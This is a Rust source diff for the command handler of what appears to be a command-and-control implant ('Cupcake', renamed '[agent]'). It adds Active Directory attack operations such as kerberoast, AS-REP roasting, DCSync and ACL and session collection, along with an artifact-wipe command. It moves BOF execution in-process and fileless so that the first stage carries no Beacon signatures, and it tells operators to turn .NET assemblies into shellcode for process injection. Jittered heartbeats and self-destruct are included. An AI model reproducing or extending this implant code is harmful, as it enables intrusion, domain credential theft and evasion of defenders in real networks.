@@ -80,6 +80,22 @@ mod bof_args_tests {
     }
 }
 
+/// Default wall-clock deadline for AD ops when server omits deadline_ms.
+#[cfg(feature = "module-loader")]
+fn default_ad_deadline_ms(op: &str) -> u64 {
+    match op {
+        "ping" | "ad_ping" => 15_000,
+        "ad_discover" => 30_000,
+        "ad_password_policy" | "ad_enum_trusts" | "ad_check_replication_rights" => 30_000,
+        "ad_ldap_query" | "ad_enum_spns" | "ad_enum_delegation" | "ad_enum_gpo"
+        | "ad_enum_privileged_groups" => 60_000,
+        "ad_enum_users" | "ad_enum_groups" | "ad_enum_computers" | "asrep_roast" => 120_000,
+        "kerberoast" | "ad_collect_sessions" | "ad_acl_collect" => 180_000,
+        "dcsync" | "ad_graph_collect" => 300_000,
+        _ => 60_000,
+    }
+}
+
 /// Stage0: command needs L2 module not yet loaded.
 #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
 fn stage0_module_required(command_type: &str) -> CommandResult {
@@ -225,14 +241,14 @@ impl MessageHandler {
     /// - `Ok(transport)`: 正常退出，返回 transport 供重连使用
     /// - `Err(e)`: 发生错误，transport 已失效
     pub async fn run(mut self) -> std::result::Result<Box<dyn Transport>, ClientError> {
-        crate::utils::db_print("[Cupcake] MessageHandler.run() started.");
+        crate::utils::db_print("[agent] MessageHandler.run() started.");
 
-        crate::utils::db_print("[Cupcake] register() started...");
+        crate::utils::db_print("[agent] register() started...");
         if let Err(e) = self.register().await {
-            crate::utils::db_print(&format!("[Cupcake] register() FAILED: {:?}", e));
+            crate::utils::db_print(&format!("[agent] register() FAILED: {:?}", e));
             return Err(e);
         }
-        crate::utils::db_print("[Cupcake] register() successful.");
+        crate::utils::db_print("[agent] register() successful.");
 
         // 🛡️ Phase 3: Adaptive Heartbeat with Gaussian Jitter
         let base_interval = crate::config::get_heartbeat_interval();
@@ -269,7 +285,7 @@ impl MessageHandler {
             let final_delay = gaussian.max(10.0).min(300.0) as u64;
 
             crate::utils::db_print(&format!(
-                "[Cupcake] Adaptive heartbeat: {}s (base: {}s, idle multiplier: {}x)",
+                "[agent] Adaptive heartbeat: {}s (base: {}s, idle multiplier: {}x)",
                 final_delay, base_interval_secs, idle_multiplier
             ));
 
@@ -346,7 +362,7 @@ impl MessageHandler {
     ///
     /// 收集系统信息并发送注册消息到服务端。
     async fn register(&mut self) -> Result<()> {
-        crate::utils::db_print("[Cupcake] register() started...");
+        crate::utils::db_print("[agent] register() started...");
         // 收集系统信息
         let sys_info = SystemInfo::collect();
         crate::utils::db_print("[agent] SystemInfo collected.");
@@ -742,75 +758,14 @@ impl MessageHandler {
             "self_destruct" => {
                 crate::utils::self_destruct().await
             }
-            // .NET: product path = isolated iso_host CLR (minimal has isolated-exec).
-            // In-process CLR only when isolated-exec is off (legacy custom builds).
-            #[cfg(feature = "isolated-exec")]
-            "execute_assembly" => {
-                let assembly = command_payload
-                    .data
-                    .as_deref()
-                    .and_then(|d| {
-                        base64::engine::general_purpose::STANDARD
-                            .decode(d.trim())
-                            .ok()
-                    });
-                match assembly {
-                    Some(bytes) if !bytes.is_empty() => {
-                        // command_content = raw args string from panel (space-separated or free text)
-                        let args_line = command_payload.command_content.trim();
-                        let args: Vec<String> = if args_line.is_empty() {
-                            Vec::new()
-                        } else {
-                            // Prefer JSON array if operator sent ["a","b"]; else single-string argv
-                            if let Ok(v) = serde_json::from_str::<Vec<String>>(args_line) {
-                                v
-                            } else {
-                                args_line
-                                    .split_whitespace()
-                                    .map(|s| s.to_string())
-                                    .collect()
-                            }
-                        };
-                        let mut r =
-                            crate::isolated_exec::run_dotnet_isolated(&bytes, &args).await;
-                        r.req_id = command_payload.req_id.clone();
-                        r
-                    }
-                    _ => CommandResult {
-                        stdout: String::new(),
-                        stderr: "execute_assembly: missing base64 assembly data".into(),
-                        path: None,
-                        req_id: command_payload.req_id.clone(),
-                    },
-                }
-            }
-            #[cfg(all(feature = "plugin", feature = "dotnet", not(feature = "isolated-exec")))]
-            "execute_assembly" => {
-                let assembly_data = if let Some(d) = command_payload.data.as_deref() {
-                    base64::engine::general_purpose::STANDARD.decode(d.trim()).ok()
-                } else {
-                    None
-                };
-
-                match crate::plugin_router::PluginRouter::parse_plugin_task(
-                    "execute-assembly",
-                    &command_payload.command_content,
-                    command_payload.req_id.clone(),
-                ) {
-                    Ok(mut task) => {
-                        if let Some(data) = assembly_data {
-                            task.data = data;
-                        }
-                        crate::plugin_router::PluginRouter::execute_plugin(task).await
-                    }
-                    Err(e) => CommandResult {
-                        stdout: String::new(),
-                        stderr: e,
-                        path: None,
-                        req_id: None,
-                    },
-                }
-            }
+            // .NET execution retired (iso_host sacrificial CLR host removed).
+            // Operators convert assemblies to shellcode (e.g. Donut) and use process_inject.
+            "execute_assembly" => CommandResult {
+                stdout: String::new(),
+                stderr: "execute_assembly retired: convert the assembly to shellcode (e.g. Donut) and use process_inject (module inject)".into(),
+                path: None,
+                req_id: command_payload.req_id.clone(),
+            },
             #[cfg(feature = "plugin")]
             "plugin_cache" => {
                 let plugin_id = command_payload.command_content.trim().to_string();
@@ -840,6 +795,150 @@ impl MessageHandler {
                             path: None,
                             req_id: command_payload.req_id.clone(),
                         },
+                    }
+                }
+            }
+
+            // Stage0-local AD artifact wipe — does NOT require module `ad` loaded.
+            #[cfg(feature = "module-loader")]
+            "ad_artifact_wipe" => {
+                match crate::ad_artifact::parse_wipe_path(
+                    &command_payload.command_content,
+                    command_payload.path.as_deref(),
+                ) {
+                    Err(e) => CommandResult {
+                        stdout: String::new(),
+                        stderr: e,
+                        path: None,
+                        req_id: command_payload.req_id.clone(),
+                    },
+                    Ok(path) => match crate::ad_artifact::wipe_ad_artifact(&path) {
+                        Ok(p) => CommandResult {
+                            stdout: format!("wiped:{p}"),
+                            stderr: String::new(),
+                            path: Some(p),
+                            req_id: command_payload.req_id.clone(),
+                        },
+                        Err(e) => CommandResult {
+                            stdout: String::new(),
+                            stderr: e,
+                            path: None,
+                            req_id: command_payload.req_id.clone(),
+                        },
+                    },
+                }
+            }
+
+            // L2 AD sacrificial worker (module_required:ad). Explicit types only — no ad_* glob.
+            // Domain protocol is NOT in Stage0; worker implements ping + ad_discover probe.
+            #[cfg(feature = "module-loader")]
+            "ad_discover"
+            | "ad_ldap_query"
+            | "ad_enum_users"
+            | "ad_enum_groups"
+            | "ad_enum_privileged_groups"
+            | "ad_enum_computers"
+            | "ad_enum_spns"
+            | "ad_enum_trusts"
+            | "ad_password_policy"
+            | "ad_enum_delegation"
+            | "ad_enum_gpo"
+            | "ad_collect_sessions"
+            | "kerberoast"
+            | "asrep_roast"
+            | "dcsync"
+            | "ad_check_replication_rights"
+            | "ad_graph_collect"
+            | "ad_acl_collect"
+            | "ad_ping" => {
+                // Hard runtime OS gate (defense-in-depth). Even if a linux build somehow
+                // receives an AD command (misrouted), refuse instead of trying to stage.
+                #[cfg(not(windows))]
+                {
+                    // On non-windows builds the entire AD surface is unsupported.
+                    let _ = &command_payload;
+                    CommandResult {
+                        stdout: String::new(),
+                        stderr: "unsupported_platform".into(),
+                        path: None,
+                        req_id: command_payload.req_id.clone(),
+                    }
+                }
+                #[cfg(windows)]
+                {
+                    if !crate::module_loader::is_module_supported_on_current_os(
+                        crate::module_loader::MOD_AD,
+                    ) {
+                        // Should not happen on a windows build, but keep the gate explicit.
+                        CommandResult {
+                            stdout: String::new(),
+                            stderr: "unsupported_platform:ad".into(),
+                            path: None,
+                            req_id: command_payload.req_id.clone(),
+                        }
+                    } else {
+                        let ct = command_payload.command_type.as_str();
+                        match crate::module_loader::ensure_module_for_command(ct) {
+                            Err(e) => CommandResult {
+                                stdout: String::new(),
+                                stderr: e,
+                                path: None,
+                                req_id: command_payload.req_id.clone(),
+                            },
+                            Ok(()) => {
+                                // Worker PE must be registered (product path)
+                                if !crate::module_supervisor::supervisor().is_ready(
+                                    crate::module_loader::MOD_AD,
+                                ) && !crate::module_loader::registry()
+                                    .is_loaded(crate::module_loader::MOD_AD)
+                                {
+                                    CommandResult {
+                                        stdout: String::new(),
+                                        stderr: format!(
+                                            "module_required:{}",
+                                            crate::module_loader::MOD_AD
+                                        ),
+                                        path: None,
+                                        req_id: command_payload.req_id.clone(),
+                                    }
+                                } else {
+                                    let op = if ct == "ad_ping" { "ping" } else { ct };
+                                    let root: serde_json::Value =
+                                        if command_payload.command_content.trim().starts_with('{') {
+                                            serde_json::from_str(
+                                                command_payload.command_content.trim(),
+                                            )
+                                            .unwrap_or(serde_json::json!({}))
+                                        } else {
+                                            serde_json::json!({
+                                                "content": command_payload.command_content,
+                                            })
+                                        };
+                                    // Server SendAdCommand wraps {op, params, deadline_ms}
+                                    let params = root
+                                        .get("params")
+                                        .cloned()
+                                        .unwrap_or_else(|| {
+                                            if root.get("op").is_some() {
+                                                serde_json::json!({})
+                                            } else {
+                                                root.clone()
+                                            }
+                                        });
+                                    let deadline = root
+                                        .get("deadline_ms")
+                                        .and_then(|v| v.as_u64())
+                                        .unwrap_or_else(|| default_ad_deadline_ms(op));
+                                    let mut r = crate::module_supervisor::execute_ad_job(
+                                        op,
+                                        &params,
+                                        deadline,
+                                    );
+                                    r.req_id = command_payload.req_id.clone();
+                                    r
+                                }
+                            }
+                        }
                     }
                 }
             }
@@ -906,9 +1005,11 @@ impl MessageHandler {
                     },
                 }
             }
-            // BOF: product path = isolated iso_host (minimal: isolated-exec, not feature=bof).
-            // In-process Module Overloading only when isolated-exec is disabled (legacy).
-            #[cfg(feature = "isolated-exec")]
+            // Classic BOF: COFF runs **in the agent process** via mod_bof (L2 module,
+            // Manual-Map, fileless, no sacrificial process). Module is staged on demand
+            // so Stage0 ships without BOF/Beacon signatures; missing module yields
+            // `module_required:bof` which the server auto-push path understands.
+            #[cfg(feature = "module-loader")]
             "bof_exec" => {
                 let content = command_payload.command_content.trim();
                 let bof_bytes = if content.starts_with("cached:") {
@@ -952,91 +1053,21 @@ impl MessageHandler {
                         };
                         // If operator sent plain text (not CS datap), pack as one length-prefixed blob
                         let arg_bytes = normalize_bof_args(&arg_bytes);
-                        let mut r =
-                            crate::isolated_exec::run_bof_isolated(&bytes, &arg_bytes).await;
+                        let mut r = match crate::module_loader::invoke_bof(&bytes, &arg_bytes) {
+                            Ok(res) => res,
+                            Err(e) => CommandResult {
+                                stdout: String::new(),
+                                stderr: e,
+                                path: None,
+                                req_id: None,
+                            },
+                        };
                         r.req_id = command_payload.req_id.clone();
                         r
                     }
                     None => CommandResult {
                         stdout: String::new(),
-                        stderr: "bof_exec: missing COFF data (push plugin data / stage iso_host first)"
-                            .to_string(),
-                        path: None,
-                        req_id: command_payload.req_id.clone(),
-                    },
-                }
-            }
-            #[cfg(all(feature = "bof", not(feature = "isolated-exec")))]
-            "bof_exec" => {
-                let content = command_payload.command_content.trim();
-                let bof_bytes = if content.starts_with("cached:") {
-                    let id = content[7..].split('|').next().unwrap_or("");
-                    #[cfg(feature = "plugin")]
-                    {
-                        crate::plugin_router::PluginRouter::get_cached_plugin(id)
-                    }
-                    #[cfg(not(feature = "plugin"))]
-                    {
-                        let _ = id;
-                        None
-                    }
-                } else {
-                    let bof_b64 = command_payload.data.as_deref().unwrap_or("");
-                    base64::engine::general_purpose::STANDARD
-                        .decode(bof_b64.trim())
-                        .ok()
-                };
-
-                match bof_bytes {
-                    Some(bytes) => {
-                        let (final_bytes, arg_bytes) = if content.starts_with("cached:") {
-                            let parts: Vec<&str> = content[7..].splitn(2, '|').collect();
-                            let args = if parts.len() > 1 {
-                                base64::engine::general_purpose::STANDARD
-                                    .decode(parts[1])
-                                    .unwrap_or_default()
-                            } else {
-                                vec![]
-                            };
-                            (bytes, args)
-                        } else {
-                            let args = base64::engine::general_purpose::STANDARD
-                                .decode(content)
-                                .unwrap_or_default();
-                            (bytes, args)
-                        };
-                        let arg_bytes = normalize_bof_args(&arg_bytes);
-
-                        #[cfg(all(feature = "bof", target_os = "windows"))]
-                        match crate::loader::bof::BofLoader::execute(&final_bytes, &arg_bytes).await
-                        {
-                            Ok(output) => CommandResult {
-                                stdout: output,
-                                stderr: String::new(),
-                                path: None,
-                                req_id: command_payload.req_id.clone(),
-                            },
-                            Err(e) => CommandResult {
-                                stdout: String::new(),
-                                stderr: format!("BOF execution failed: {}", e),
-                                path: None,
-                                req_id: command_payload.req_id.clone(),
-                            },
-                        }
-                        #[cfg(not(all(feature = "bof", target_os = "windows")))]
-                        {
-                            let _ = (final_bytes, arg_bytes);
-                            CommandResult {
-                                stdout: String::new(),
-                                stderr: "BOF execution is only supported on Windows".to_string(),
-                                path: None,
-                                req_id: command_payload.req_id.clone(),
-                            }
-                        }
-                    }
-                    None => CommandResult {
-                        stdout: String::new(),
-                        stderr: "Failed to obtain BOF data (not in cache and no data provided)"
+                        stderr: "bof_exec: missing COFF data (push plugin data / stage bof module first)"
                             .to_string(),
                         path: None,
                         req_id: command_payload.req_id.clone(),
